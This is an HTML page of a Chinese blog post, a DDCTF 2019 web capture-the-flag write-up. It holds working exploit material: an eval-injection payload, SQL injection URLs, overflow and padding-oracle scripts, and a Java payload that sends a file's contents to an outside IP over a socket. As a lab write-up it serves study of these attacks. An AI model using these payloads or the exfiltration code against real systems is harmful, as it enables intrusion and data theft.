@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="syang">
+  <meta name="description" content="Life Is Like A Boat">
+  
+  
+  <link rel="prev" href="https://syang-ng.github.io/2019/04/kanxue-transformer/" />
+  <link rel="next" href="https://syang-ng.github.io/2019/05/ethernaut-part-writeup/" />
+  <link rel="canonical" href="https://syang-ng.github.io/2019/04/ddctf2019-web/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           DDCTF2019 Web 填坑 | syang&#39;s blog
+       
+  </title>
+  <meta name="title" content="DDCTF2019 Web 填坑 | syang&#39;s blog">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/syang-ng.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "DDCTF2019 Web 填坑",
+    "headline" : "DDCTF2019 Web 填坑",
+    "description" : "前言 DDCTF 2019 Web，特地记录一下当时没做的或者好玩的题目 homebrew event loop http:\/\/116.85.48.107:5002\/d5af33f66147e857 源码审计： # -*- encoding: utf-8 -*- # written in python 2.7 __author__ = \x27garzon\x27 from flask import Flask, session, request, Response import urllib app = Flask(__name__) app.secret_key = \x27*********************\x27 # censored url_prefix = \x27\/d5af33f66147e857\x27 def FLAG():",
+    "inLanguage" : "zh-cn",
+    "author" : "syang",
+    "creator" : "syang",
+    "publisher": "syang",
+    "accountablePerson" : "syang",
+    "copyrightHolder" : "syang",
+    "copyrightYear" : "2019",
+    "datePublished": "2019-04-25 19:29:23 \x2b0000 UTC",
+    "dateModified" : "2019-04-25 19:29:23 \x2b0000 UTC",
+    "url" : "https:\/\/syang-ng.github.io\/2019\/04\/ddctf2019-web\/",
+    "wordCount" : "2219",
+    "keywords" : [  "syang\x27s blog"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="dark-theme">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">DDCTF2019 Web 填坑</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://syang-ng.github.io" rel="author">syang</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2019-04-25 itemprop="datePublished">April 25, 2019</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="https://syang-ng.github.io/categories/ctf/"> CTF </a>
+                        <a href="https://syang-ng.github.io/categories/web/"> Web </a>
+                        
+                </span>
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          
+
+<h2 id="前言">前言</h2>
+
+<p>DDCTF 2019 Web，特地记录一下当时没做的或者好玩的题目</p>
+
+<h2 id="homebrew-event-loop">homebrew event loop</h2>
+
+<p><a href="http://116.85.48.107:5002/d5af33f66147e857" rel="nofollow noreferrer" target="_blank">http://116.85.48.107:5002/d5af33f66147e857</a></p>
+
+<p>源码审计：</p>
+
+<pre><code class="language-python"># -*- encoding: utf-8 -*- 
+# written in python 2.7 
+__author__ = 'garzon' 
+
+from flask import Flask, session, request, Response 
+import urllib 
+
+app = Flask(__name__) 
+app.secret_key = '*********************' # censored 
+url_prefix = '/d5af33f66147e857' 
+
+def FLAG(): 
+    return 'FLAG_is_here_but_i_wont_show_you'  # censored 
+     
+def trigger_event(event): 
+    session['log'].append(event) 
+    if len(session['log']) &gt; 5: session['log'] = session['log'][-5:] 
+    if type(event) == type([]): 
+        request.event_queue += event 
+    else: 
+        request.event_queue.append(event) 
+
+def get_mid_str(haystack, prefix, postfix=None): 
+    haystack = haystack[haystack.find(prefix)+len(prefix):] 
+    if postfix is not None: 
+        haystack = haystack[:haystack.find(postfix)] 
+    return haystack 
+     
+class RollBackException: pass 
+
+def execute_event_loop(): 
+    valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#') 
+    resp = None 
+    while len(request.event_queue) &gt; 0: 
+        event = request.event_queue[0] # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot; 
+        request.event_queue = request.event_queue[1:] 
+        if not event.startswith(('action:', 'func:')): continue 
+        for c in event: 
+            if c not in valid_event_chars: break 
+        else: 
+            is_action = event[0] == 'a' 
+            action = get_mid_str(event, ':', ';') 
+            args = get_mid_str(event, action+';').split('#') 
+            try: 
+                event_handler = eval(action + ('_handler' if is_action else '_function')) 
+                ret_val = event_handler(args) 
+            except RollBackException: 
+                if resp is None: resp = '' 
+                resp += 'ERROR! All transactions have been cancelled. &lt;br /&gt;' 
+                resp += '&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' 
+                session['num_items'] = request.prev_session['num_items'] 
+                session['points'] = request.prev_session['points'] 
+                break 
+            except Exception, e: 
+                if resp is None: resp = '' 
+                #resp += str(e) # only for debugging 
+                continue 
+            if ret_val is not None: 
+                if resp is None: resp = ret_val 
+                else: resp += ret_val 
+    if resp is None or resp == '': resp = ('404 NOT FOUND', 404) 
+    session.modified = True 
+    return resp 
+     
+@app.route(url_prefix+'/') 
+def entry_point(): 
+    querystring = urllib.unquote(request.query_string) 
+    request.event_queue = [] 
+    if querystring == '' or (not querystring.startswith('action:')) or len(querystring) &gt; 100: 
+        querystring = 'action:index;False#False' 
+    if 'num_items' not in session: 
+        session['num_items'] = 0 
+        session['points'] = 3 
+        session['log'] = [] 
+    request.prev_session = dict(session) 
+    trigger_event(querystring) 
+    return execute_event_loop() 
+
+# handlers/functions below -------------------------------------- 
+
+def view_handler(args): 
+    page = args[0] 
+    html = '' 
+    html += '[INFO] you have {} diamonds, {} points now.&lt;br /&gt;'.format(session['num_items'], session['points']) 
+    if page == 'index': 
+        html += '&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;' 
+        html += '&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;' 
+        html += '&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;' 
+    elif page == 'shop': 
+        html += '&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;' 
+    elif page == 'reset': 
+        del session['num_items'] 
+        html += 'Session reset.&lt;br /&gt;' 
+    html += '&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' 
+    return html 
+
+def index_handler(args): 
+    bool_show_source = str(args[0]) 
+    bool_download_source = str(args[1]) 
+    if bool_show_source == 'True': 
+     
+        source = open('eventLoop.py', 'r') 
+        html = '' 
+        if bool_download_source != 'True': 
+            html += '&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;' 
+            html += '&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;' 
+             
+        for line in source: 
+            if bool_download_source != 'True': 
+                html += line.replace('&amp;','&amp;amp;').replace('\t', '&amp;nbsp;'*4).replace(' ','&amp;nbsp;').replace('&lt;', '&amp;lt;').replace('&gt;','&amp;gt;').replace('\n', '&lt;br /&gt;') 
+            else: 
+                html += line 
+        source.close() 
+         
+        if bool_download_source == 'True': 
+            headers = {} 
+            headers['Content-Type'] = 'text/plain' 
+            headers['Content-Disposition'] = 'attachment; filename=serve.py' 
+            return Response(html, headers=headers) 
+        else: 
+            return html 
+    else: 
+        trigger_event('action:view;index') 
+         
+def buy_handler(args): 
+    num_items = int(args[0]) 
+    if num_items &lt;= 0: return 'invalid number({}) of diamonds to buy&lt;br /&gt;'.format(args[0]) 
+    session['num_items'] += num_items  
+    trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index']) 
+     
+def consume_point_function(args): 
+    point_to_consume = int(args[0]) 
+    if session['points'] &lt; point_to_consume: raise RollBackException() 
+    session['points'] -= point_to_consume 
+     
+def show_flag_function(args): 
+    flag = args[0] 
+    #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. 
+    return 'You naughty boy! ;) &lt;br /&gt;' 
+     
+def get_flag_handler(args): 
+    if session['num_items'] &gt;= 5: 
+        trigger_event('func:show_flag;' + FLAG()) # show_flag_function has been disabled, no worries 
+    trigger_event('action:view;index') 
+     
+if __name__ == '__main__': 
+    app.run(debug=False, host='0.0.0.0') 
+</code></pre>
+
+<p>很明显 <code>event_handler = eval(action + ('_handler' if is_action else '_function'))</code> 处有明显漏洞，由于我们可以控制 <code>action</code> 参数，所以可以在参数最后拼接 <code>#</code> 注释代码进而代码执行。</p>
+
+<p>最终 payload 如下：</p>
+
+<pre><code>116.85.48.107:5002/d5af33f66147e857/?action:trigger_event%23;action:buy;1%23action:buy;3%23action:get_flag;
+</code></pre>
+
+<p>虽然 <code>get_flag</code> 没有回显，但由于程序会将相应的结果写入 <code>session['log']</code>，所以可以通过解密 session 的方式获得 flag，对应的解密脚本地址：<a href="https://github.com/noraj/flask-session-cookie-manager" rel="nofollow noreferrer" target="_blank">https://github.com/noraj/flask-session-cookie-manager</a></p>
+
+<h2 id="大吉大利-今晚吃鸡">大吉大利，今晚吃鸡</h2>
+
+<p>Go 语言的整数溢出问题，最后需要编写脚本</p>
+
+<p>问题在于 <code>http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=2000</code> 的 <code>ticket_price</code> 可控，而当我们设置 <code>ticket_price</code> 为 <code>2**32</code> 时，可以发现购买成功。很明显后端在处理购买逻辑时将我们输入的价格作为有符号数进行处理，进而触发整数溢出问题（这里卡了很久，一直以为是 uint64 最后发现竟然是 uint32，批判一下自己，单纯懒得尝试就弃好久</p>
+
+<p>最后写脚本，真·我杀我自己：</p>
+
+<pre><code class="language-python">import json
+import requests
+
+basename = 'aabbcc'
+baseUrl = 'http://117.51.147.155:5050/ctf/api/'
+
+def register(s, q):
+    return s.get(baseUrl+'register', params=q)
+
+def login(s, q):
+    return s.get(baseUrl+'login', params=q)
+
+def buy_ticket(s):
+    res = s.get(baseUrl+'buy_ticket', params={&quot;ticket_price&quot;: 2**32})
+    res = json.loads(res.text)
+    return res['data'][0]['bill_id']
+
+def pay_ticket(s, bill_id):
+    res = s.get(baseUrl+'pay_ticket', params={'bill_id': bill_id})
+    res = json.loads(res.text)
+    return {'id': res['data'][0]['your_id'], 'ticket': res['data'][0]['your_ticket']}
+
+def remove_robot(s, p):
+    return s.get(baseUrl+'remove_robot', params=p)
+
+def getOneTicket(i):
+    s = requests.Session()
+    np = basename+str(i)
+    register(s, {'name': np, 'password': np})
+    login(s, {'name': np, 'password': np})
+    bill_id = buy_ticket(s)
+    return pay_ticket(s, bill_id)
+
+def getMain():
+    s = requests.Session()
+    np = basename+'flag'
+    #register(s, {'name': np, 'password': np})
+    login(s, {'name': np, 'password': np})
+    #bill_id = buy_ticket(s)
+    #pay_ticket(s, bill_id)
+    return s
+
+def main():
+    robots = []
+    s = getMain()
+    for i in range(750, 800):
+        robot = getOneTicket(i)
+        remove_robot(s, robot)
+        print(robot)
+    flag = s.get(baseUrl+'get_flag').text
+    print(flag)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+
+<h2 id="欢迎报名ddctf">欢迎报名DDCTF</h2>
+
+<p>以为是个注入，没想到是个 xss + 注入 (lll￢ω￢)，赛后看别人 writeup 做的</p>
+
+<p>xss 读取源码，发现接口 <code>query_aIeMu0FUoVrW0NWPHbN6z4xh.php</code>：</p>
+
+<pre><code class="language-html">&lt;!DOCTYPE_html&gt;
+&lt;html_lang=&quot;en&quot;&gt;
+    &lt;head&gt; 
+        &lt;meta_charset=&quot;UTF-8&quot;&gt;
+        &lt;!--每隔30秒自动刷新--&gt;
+        &lt;meta_http-equiv=&quot;refresh&quot;_content=&quot;30&quot;&gt;
+        &lt;title&gt;DDCTF报名列表&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;table__align=&quot;center&quot;_&gt;
+            &lt;thead&gt;
+                &lt;tr&gt;
+                    &lt;th&gt;姓名&lt;/th&gt; 
+                    &lt;th&gt;昵称&lt;/th&gt;
+                    &lt;th&gt;备注&lt;/th&gt;
+                    &lt;th&gt;时间&lt;/th&gt;
+                &lt;/tr&gt;
+            &lt;/thead&gt;
+            &lt;tbody&gt;
+                &lt;!--_列表循环展示_--&gt;
+                &lt;tr&gt;
+                    &lt;td&gt;&lt;a_target=&quot;_blank&quot;__href=&quot;index_php&quot;&gt;报名&lt;/a&gt;&lt;/td&gt;
+                &lt;/tr&gt;
+                &lt;!--_&lt;a_target=&quot;_blank&quot;__href=&quot;query_aIeMu0FUoVrW0NWPHbN6z4xh_php&quot;&gt;_接口_&lt;/a&gt;--&gt;
+            &lt;/tbody&gt;
+        &lt;/table&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>注入：</p>
+
+<pre><code># database: ctfdb
+http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1%df%27or%201%20union%20select%201,group_concat(schema_name),3,4,5%20from%20information_schema.schemata%23
+# table: ctf_fhmHRPL5
+http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1%df%27union+select+1,TABLE_NAME,2,3,4%20FROM%20information_schema.tables%20WHERE%20TABLE_SCHEMA=0x6374666462;%23
+# column: ctf_value
+http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1%df%27UNION+SELECT+1,+GROUP_CONCAT(column_name),2,3,4+FROM+information_schema.columns+WHERE+table_name=0x6374665f66686d4852504c35;%23
+# flag: DDCTF{GqFzOt8PcoksRg66fEe4xVBQZwp3jWJS}
+http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1%df%27UNION+SELECT+1,+ctf_value,2,3,4+FROM+ctfdb.ctf_fhmHRPL5;%23
+</code></pre>
+
+<h2 id="mysql弱口令">mysql弱口令</h2>
+
+<p>主要考点就是通过 MySQL LOAD DATA 的特性进行任意文件的读取，直接部署 <a href="https://github.com/allyshka/Rogue-MySql-Server" rel="nofollow noreferrer" target="_blank">https://github.com/allyshka/Rogue-MySql-Server</a> 上的脚本进行文件读取即可。</p>
+
+<p>正常的思路是：<code>读取源码</code> =&gt; <code>读取数据库信息</code> =&gt; <code>读取数据库文件</code> =&gt; <code>获得 flag</code>，可以发现 flag 在 <code>/var/lib/mysql/security/flag.ibd</code> 文件中。</p>
+
+<p>还有一种思路则是直接读取 <code>/root/.mysql_history</code>，由于 mysql 进行操作的时候会将 log 写入相应的记录文件中，所以可以直接从 log 文件中读取相应的 flag。</p>
+
+<h2 id="再来1杯java">再来1杯Java</h2>
+
+<p>愉快的学习 java web 之路。。</p>
+
+<p>padding oracle：</p>
+
+<pre><code class="language-python">import requests
+import base64
+import binascii
+
+url = &quot;http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/gen_token&quot;
+base_token = base64.b64decode(&quot;UGFkT3JhY2xlOml2L2NiY8O+7uQmXKFqNVUuI9c7VBe42FqRvernmQhsxyPnvxaF&quot;)
+result = ''
+
+for index in range(2):
+    encrypt = base_token[16*(index+1):16*(index+2)]
+    prev = base_token[:16*index]
+    c_iv = base_token[16*index:16*(index+1)]
+    mid_value = 0
+    for i in range(1, 17):
+        for j in range(256):
+            if mid_value:
+                padding =  hex(mid_value ^ int(binascii.hexlify(chr(i)*(i-1)), 16)).strip('L')[2::]
+                if len(padding) % 2:
+                    padding = '0'+padding 
+                token = '{}{}{}{}{}'.format(prev, chr(0)*(16-i), chr(j), binascii.unhexlify(padding), encrypt)
+            else:
+                token = '{}{}{}{}'.format(prev, chr(0)*(16-i), chr(j), encrypt)
+            
+            headers = {
+                'Cookie': &quot;token=&quot;+base64.b64encode(token)
+            }
+            response = requests.get(url, headers=headers)
+            if response.text.strip() != &quot;decrypt err~&quot;:
+                mid_value += ((i ^ j) &lt;&lt; (8*(i-1)))
+                print(hex(mid_value))
+                break
+    
+    mid_value = hex(mid_value).strip('L')[2::]
+    if len(mid_value) % 2:
+        mid_value = '0' + mid_value
+
+    result += ''.join([chr(ord(x)^ord(y)) for x, y in zip(c_iv, binascii.unhexlify(mid_value))])
+    print(result)
+
+print(result)
+</code></pre>
+
+<p>最后得到明文： <code>{&quot;id&quot;:100,&quot;roleAdmin&quot;:false}\x04\x04\x04\x04</code></p>
+
+<p>很明显需要因此构造出： <code>{&quot;id&quot;:100,&quot;roleAdmin&quot;:true}\x06\x05\x05\x05\x05</code>，此时的需要构造如下 iv（懒得算了，参考他人 writeup）：</p>
+
+<pre><code class="language-python">c1t='c3beeee4265cb3792c43365bd63a5516'  # iv2
+0x00df71d27118c10e13141c66fc84619b  # mid
+ivt='7bfd18b65322f03e23383e1493e804da'  # iv
+
+print base64.b64encode(ivt.decode('hex')+c1t.decode('hex')+base_token[32:48])
+</code></pre>
+
+<p>登录成功后由 <code>http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/fileDownload?fileName=1.txt</code> 获得 hint:</p>
+
+<pre><code>Try to hack~ 
+Hint:
+1. Env: Springboot + JDK8(openjdk version &quot;1.8.0_181&quot;) + Docker~ 
+2. You can not exec commands~ 
+</code></pre>
+
+<p>很明显此处有一个任意文件读的问题存在，但受到了很明显的限制，经过尝试后发现在 <code>/proc/self/fd/15</code> 可以获得源码。</p>
+
+<p>之后就是源码审计 + 利用 JRMP 反序列化漏洞，相关的利用点在</p>
+
+<p><code>http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/nicaibudao_hahaxxxx/deserial?base64Info=</code> 接口处</p>
+
+<p>详情参考 <a href="https://xz.aliyun.com/t/4862#toc-7" rel="nofollow noreferrer" target="_blank">2019-DDCTF-WEB-WriteUp - 再来一篇 java</a>，本人最后执行的 payload 如下：</p>
+
+<pre><code class="language-Java">java.net.Socket s = new java.net.Socket(&quot;39.108.230.53&quot;,8768);
+java.io.File file = new java.io.File(&quot;/flag/flag_7ArPnpf3XW8Npsmj&quot;);
+java.io.InputStream in = new java.io.FileInputStream(file);
+int tempbyte;
+while ((tempbyte = in.read()) != -1) {
+  java.io.OutputStream out = s.getOutputStream();
+  out.write(tempbyte);
+}
+in.close();
+s.close();
+</code></pre>
+
+<p>最后在反弹出的 shell 里接到 flag:</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/DDCTF2019-Web/DDCTF2019-Web-Java.png" alt="Flag" class="lazyload"><figcaption class="image-caption">Flag</figcaption></figure></p>
+
+<h2 id="参考链接">参考链接</h2>
+
+<ul>
+<li><a href="https://xz.aliyun.com/t/3973" rel="nofollow noreferrer" target="_blank">通过MySQL LOAD DATA特性来达到任意文件读取</a></li>
+<li><a href="https://xz.aliyun.com/t/4862" rel="nofollow noreferrer" target="_blank">2019-DDCTF-WEB-WriteUp</a></li>
+<li><a href="https://www.zhaoj.in/read-5269.html" rel="nofollow noreferrer" target="_blank">DDCTF 2019 Web 部分 WriteUp</a></li>
+<li><a href="https://www.xmsec.cc/ddctf-2019-writeup/" rel="nofollow noreferrer" target="_blank">DDCTF 2019 partial writeup</a></li>
+<li><a href="https://xz.aliyun.com/t/2479" rel="nofollow noreferrer" target="_blank">Weblogic JRMP反序列化漏洞回顾</a></li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>syang </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://syang-ng.github.io/2019/04/ddctf2019-web/>https://syang-ng.github.io/2019/04/ddctf2019-web/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://syang-ng.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://syang-ng.github.io/2019/04/kanxue-transformer/" class="prev" rel="prev" title="看雪CTF - 变形金钢"><i class="iconfont icon-left"></i>&nbsp;看雪CTF - 变形金钢</a>
+         
+        
+        <a href="https://syang-ng.github.io/2019/05/ethernaut-part-writeup/" class="next" rel="next" title="Ethernaut 部分题解">Ethernaut 部分题解&nbsp;<i class="iconfont icon-right"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2017 - 2019</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://syang-ng.github.io">syang</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
